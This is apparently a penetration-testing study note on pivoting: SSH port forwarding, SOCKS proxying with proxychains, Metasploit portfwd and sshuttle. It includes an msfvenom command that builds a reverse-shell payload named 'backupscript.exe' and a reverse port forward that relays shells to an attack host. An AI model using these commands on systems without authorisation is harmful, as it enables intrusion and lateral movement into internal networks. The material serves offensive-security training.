**Overview:**
- Port forwarding redirects communication requests from one port to another, using TCP as the primary transport. SSH or SOCKS can be used to encapsulate forwarded traffic, effectively bypassing firewalls and leveraging existing services on a compromised host to pivot into other networks.
- Local port forwarding allows accessing services on a remote host as if they were running locally, enabling exploitation of services that would otherwise be unreachable from the attack machine.
- Meterpreter's `portfwd` module can establish a listener on the attack host and forward all received packets via the Meterpreter session to a remote host on an internal network.
- Metasploit also supports reverse port forwarding, listening on a specific port on the compromised server and forwarding incoming shells back to the attack host.
- `sshuttle` is a Python tool that automates `iptables` rules for SSH-based pivoting, removing the need for proxychains. It only supports SSH pivoting and does not work over TOR or HTTPS proxies.
---
## Local Port Forwarding

```bash
ssh -L 1234:localhost:3306 ubuntu@<target>
```

Forward local port `1234` to `localhost:3306` on the remote host. `-L` instructs the SSH client to forward all data sent to the local port to the specified destination on the remote server.

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@<target>
```

Forward multiple ports in a single SSH connection.

---

## Dynamic Port Forwarding (SOCKS Proxy)

```bash
ssh -D 9050 ubuntu@<target>
```

Enable dynamic port forwarding. `-D` creates a SOCKS proxy on local port `9050`, routing all traffic through the SSH tunnel.

```bash
proxychains nmap -v -Pn -sT <target>
```

Scan a host through the pivot using proxychains. Requires `socks4 127.0.0.1 9050` in `/etc/proxychains.conf`.

```bash
proxychains msfconsole
```

Launch Metasploit through the proxy to route all associated traffic through the tunnel.

---
## Metasploit Port Forwarding

```bash
meterpreter > portfwd add -l 3300 -p 3389 -r <target>
```

Start a listener on the attack host's local port (`-l`) and forward all packets to the remote host (`-r`) on the specified port (`-p`) via the Meterpreter session.

```bash
xfreerdp /v:localhost:3300 /u:<user> /p:<password>
```

Connect to the forwarded RDP session through localhost.

---
## Meterpreter Reverse Port Forwarding

```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L <lhost>
```

Create a reverse port forward. Forwards all connections on port `1234` on the compromised server to the attack host on local port (`-l`) `8081`. `-R` enables reverse mode, `-L` specifies the attack host IP.

```bash
msf6 > set payload windows/x64/meterpreter/reverse_tcp
```

Background the session and set the reverse TCP payload.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o backupscript.exe
```

Generate the payload with msfvenom. `-p` payload, `LHOST` attack host IP, `LPORT` must match the port configured in `portfwd`. Executing the payload on the Windows host returns a shell pivoted through the compromised server.

---
## sshuttle

```bash
sudo sshuttle -r ubuntu@<pivot> <subnet>/23 -v
```

Route all traffic destined for `<subnet>/23` through the SSH pivot host. `-r` specifies the remote host, `-v` enables verbose output. Creates `iptables` rules automatically, removing the need for proxychains configuration.
